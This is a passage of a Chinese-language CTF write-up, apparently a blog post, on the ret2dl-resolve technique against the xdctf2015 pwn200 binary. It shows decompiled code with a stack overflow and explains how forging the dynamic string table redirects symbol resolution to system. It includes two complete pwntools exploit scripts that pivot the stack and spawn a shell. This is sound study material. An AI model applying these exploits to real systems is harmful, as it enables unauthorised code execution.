class="line">st_type=<span class="number">0x2</span></span><br><span class="line">st_info=((st_bind) &lt;&lt; <span class="number">4</span>) + ((st_type) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]</span></span><br><span class="line">payload3+=p32(reloc_index)     </span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(base_addr+<span class="number">80</span>)</span><br><span class="line">payload3+=<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload3+=<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload3+=fake_reloc</span><br><span class="line">payload3+=<span class="string">&#x27;B&#x27;</span>*align</span><br><span class="line">payload3+=fake_sym   </span><br><span class="line">payload3+=<span class="string">&quot;system\x00&quot;</span>                           </span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><h4 id="保护检查-1"><a href="#保护检查-1" class="headerlink" title="保护检查"></a>保护检查</h4><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236523.png" alt="image-20220701220149426"></p>
<p>与之前相比，没有开启RELRO，则dynamic 可写</p>
<h4 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *p_argc; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在栈溢出漏洞</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里选择利用栈迁移至bss段攻击利用。</p>
<p>由于dynamic段是可写的，我们可以伪造ELF String Table 的指针，即DT_STRTAB的d_ptr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">080497</span>C4 _DYNAMIC        Elf32_Dyn &lt;<span class="number">1</span>, &lt;<span class="number">1</span>&gt;&gt;      ; DATA XREF: LOAD:<span class="number">080480B</span>C↑o</span><br><span class="line">LOAD:<span class="number">080497</span>C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:<span class="number">080497</span>C4                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">080497</span>CC                 Elf32_Dyn &lt;<span class="number">0</span>Ch, &lt;<span class="number">804832</span>Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">080497</span>D4                 Elf32_Dyn &lt;<span class="number">0</span>Dh, &lt;<span class="number">8048634</span>h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">080497</span>DC                 Elf32_Dyn &lt;<span class="number">19</span>h, &lt;<span class="number">80497B</span>Ch&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">080497E4</span>                 Elf32_Dyn &lt;<span class="number">1B</span>h, &lt;<span class="number">4</span>&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">080497</span>EC                 Elf32_Dyn &lt;<span class="number">1</span>Ah, &lt;<span class="number">80497</span>C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">080497F</span>4                 Elf32_Dyn &lt;<span class="number">1</span>Ch, &lt;<span class="number">4</span>&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">080497F</span>C                 Elf32_Dyn &lt;<span class="number">6F</span>FFFEF5h, &lt;<span class="number">804818</span>Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">08049804</span>                 Elf32_Dyn &lt;<span class="number">5</span>, &lt;<span class="number">804824</span>Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:<span class="number">0804980</span>C                 Elf32_Dyn &lt;<span class="number">6</span>, &lt;<span class="number">80481</span>ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">08049814</span>                 Elf32_Dyn &lt;<span class="number">0</span>Ah, &lt;<span class="number">6B</span>h&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">0804981</span>C                 Elf32_Dyn &lt;<span class="number">0B</span>h, &lt;<span class="number">10</span>h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">08049824</span>                 Elf32_Dyn &lt;<span class="number">15</span>h, &lt;<span class="number">0</span>&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">0804982</span>C                 Elf32_Dyn &lt;<span class="number">3</span>, &lt;<span class="number">80498B</span>8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">08049834</span>                 Elf32_Dyn &lt;<span class="number">2</span>, &lt;<span class="number">28</span>h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0804983</span>C                 Elf32_Dyn &lt;<span class="number">14</span>h, &lt;<span class="number">11</span>h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">08049844</span>                 Elf32_Dyn &lt;<span class="number">17</span>h, &lt;<span class="number">8048304</span>h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:<span class="number">0804984</span>C                 Elf32_Dyn &lt;<span class="number">11</span>h, &lt;<span class="number">80482</span>ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:<span class="number">08049854</span>                 Elf32_Dyn &lt;<span class="number">12</span>h, &lt;<span class="number">18</span>h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:<span class="number">0804985</span>C                 Elf32_Dyn &lt;<span class="number">13</span>h, &lt;<span class="number">8</span>&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:<span class="number">08049864</span>                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFEh, &lt;<span class="number">80482</span>CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0804986</span>C                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFFh, &lt;<span class="number">1</span>&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">08049874</span>                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFF0h, &lt;<span class="number">80482B</span>8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0804987</span>C                 Elf32_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>

<p>而<code>_dl_fixup</code>是调用<code>_dl_lookup_symbol_x</code>进行寻找函数地址，其中传入的参数strtab + sym-&gt;st_name决定传入哪个符号的字符串指针就解析成为哪个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">  version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>); </span><br></pre></td></tr></table></figure>

<p>因此我们可以在bss或栈上伪造一个ELF String Table（.dynstr section）（视情况将某个函数更改为system），然后覆盖对应的结构体指针为fake_dynstr；这样在动态链接的时候就会将该符号解析为system函数。</p>
<p>首先进行栈迁移，其主要目的是将esp迁移至bss段，迁移完成之后我们就可写入read 和fake_dystr并篡改strtab的指针指向fake_dynstr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt)+p32(ppp_ret)+p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">0x300</span>)+p32(<span class="number">0x500</span>)</span><br><span class="line">payload1+=p32(pop_ebp)+p32(bss_addr+<span class="number">0x300</span>)+p32(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">ppp_ret是为了清空栈中的数据 p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">0x300</span>)+p32(<span class="number">0x500</span>) 使pop ebp的数据为 p32(bss_addr+<span class="number">0x300</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">strtab=<span class="number">0x08049808</span></span><br><span class="line">payload2=p32(<span class="number">0xdeadbeef</span>)+p32(read_plt)+p32(<span class="number">0x080483a6</span>)+p32(<span class="number">0</span>)+p32(strtab)+p32(<span class="number">8</span>)+fake_dynstr</span><br><span class="line"><span class="built_in">print</span> payload2</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3=p32(bss_addr+<span class="number">0x300</span>+<span class="number">24</span>)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.plt:080483A6                 push    20h ; &#x27; &#x27;</span></span><br><span class="line"><span class="string">.plt:080483AB                 jmp     sub_8048350</span></span><br><span class="line"><span class="string">0x080483A6 对应的为write@plt+6</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fake_dynstr的地址就是 bss_addr+<span class="number">0x300</span>+<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236524.png" alt="image-20220701223600127"></p>
<p>即先篡改strtab指针为我们伪造的fake_dynstr，将write替换为system，然后返回执行write@plt+6寻找write函数的地址，实际寻找到的是system</p>
<p>如下图所示，strtab已被修改为fake_dynstr</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236525.png" alt="image-20220701225222732"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236526.png" alt="image-20220701225021561"></p>
<p>我们向read(0,strtab,8)中发送的数据为p32(bss_addr+0x300+24)+’;sh’。然后调用write@plt+6实际调用的是system，则会执行system(p32(bss_addr+0x300+24)+’;sh’)，但是system(p32(bss_addr+0x300+24))肯定会执行失败，于是就会执行system(‘sh’)</p>
<p>这道题主要是利用了NO RELRO的.dynamic section可写缺陷，从而getshell。但是不能直接篡改ELF String Table中的write为system，因为ELF String Table不可写。</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./bof_32&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof_32&#x27;</span>)</span><br><span class="line">leave_ret= <span class="number">0x08048445</span></span><br><span class="line">pop_ebp= <span class="number">0x0804862b</span></span><br><span class="line">ppp_ret=<span class="number">0x08048629</span>  <span class="meta">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">print hex(bss_addr)</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt)+p32(ppp_ret)+p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">0x300</span>)+p32(<span class="number">0x500</span>)</span><br><span class="line">payload1+=p32(pop_ebp)+p32(bss_addr+<span class="number">0x300</span>)+p32(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&#x27;write&#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strtab=<span class="number">0x08049808</span></span><br><span class="line">payload2=p32(<span class="number">0xdeadbeef</span>)+p32(read_plt)+p32(<span class="number">0x080483a6</span>)+p32(<span class="number">0</span>)+p32(strtab)+p32(<span class="number">8</span>)+fake_dynstr</span><br><span class="line">print payload2</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3=p32(bss_addr+<span class="number">0x300</span>+<span class="number">24</span>)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一种方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./bof_32&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof_32&#x27;</span>)</span><br><span class="line">leave_ret= <span class="number">0x08048445</span></span><br><span class="line">pop_ebp= <span class="number">0x0804862b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">strtab=<span class="number">0x08049808</span></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt)+p32(vuln_addr)+p32(<span class="number">0</span>)+p32(strtab)+p32(<span class="number">8</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(p64(new_stack+<span class="number">0x10</span>)) <span class="comment">#修改strtab 指向new stack+0x10</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt)+p32(vuln_addr)+p32(<span class="number">0</span>)+p32(new_stack)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload3=<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+fake_dynstr </span><br><span class="line">p.send(payload3)      <span class="comment">#new_stack为&quot;/bin/sh\x00&quot;.ljust(0x10,&#x27;\x00&#x27;)+fake_dynstr，new_stack+0x10中存储着fake_dynstr</span></span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt+<span class="number">6</span>)+p32(<span class="number">0</span>)+p32(new_stack)  <span class="comment">#调用read@plt+6 实际调用的是system,参数为new_stack ,而new_stack的起始内容为/bin/sh\x00.</span></span><br><span class="line">p.send(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




    </article>
    <!-- license -->
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="非栈上的格式化字符串漏洞">
                    <div class="nextTitle">非栈上的格式化字符串漏洞</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2022/04/25/srop/" title="srop">
                    <div class="prevTitle">srop</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dl-resolve"><span class="toc-number">1.</span> <span class="toc-text">ret2dl-resolve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dl-runtime-resolve%E5%87%BD%E6%95%B0%E5%85%B7%E4%BD%93%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">_dl_runtime_resolve函数具体运行模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5printf%E4%B8%BA%E4%BE%8B%E8%BF%BD%E8%B8%AA%E4%B8%80%E4%B8%8BELF%E6%96%87%E4%BB%B6libc%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">以printf为例追踪一下ELF文件libc函数解析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ELF%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">ELF格式分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DYNAMIC"><span class="toc-number">4.1.1.</span> <span class="toc-text">_DYNAMIC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DYNAMIC-gt-DT-STRTAB"><span class="toc-number">4.1.2.</span> <span class="toc-text">_DYNAMIC-&gt;DT_STRTAB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DYNAMIC-gt-DT-SYMTAB"><span class="toc-number">4.1.3.</span> <span class="toc-text">_DYNAMIC-&gt;DT_SYMTAB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DYNAMIC-gt-DT-JMPREL"><span class="toc-number">4.1.4.</span> <span class="toc-text">_DYNAMIC-&gt;DT_JMPREL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#segment-and-section"><span class="toc-number">4.1.5.</span> <span class="toc-text">segment and section</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-runtime-resolve"><span class="toc-number">4.2.</span> <span class="toc-text">_dl_runtime_resolve</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-fixup%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.</span> <span class="toc-text">_dl_fixup执行流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">过程总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">6.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98xdctf2015-pwn200"><span class="toc-number">7.</span> <span class="toc-text">例题xdctf2015_pwn200</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">7.1.</span> <span class="toc-text">Partial RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">7.2.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">7.3.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#stage1"><span class="toc-number">7.4.1.</span> <span class="toc-text">stage1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage2"><span class="toc-number">7.4.2.</span> <span class="toc-text">stage2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage3"><span class="toc-number">7.4.3.</span> <span class="toc-text">stage3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage4"><span class="toc-number">7.4.4.</span> <span class="toc-text">stage4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage5"><span class="toc-number">7.4.5.</span> <span class="toc-text">stage5</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage6"><span class="toc-number">7.4.6.</span> <span class="toc-text">stage6</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">7.5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">7.6.</span> <span class="toc-text">NO RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5-1"><span class="toc-number">7.7.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">7.8.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">7.9.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">7.10.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
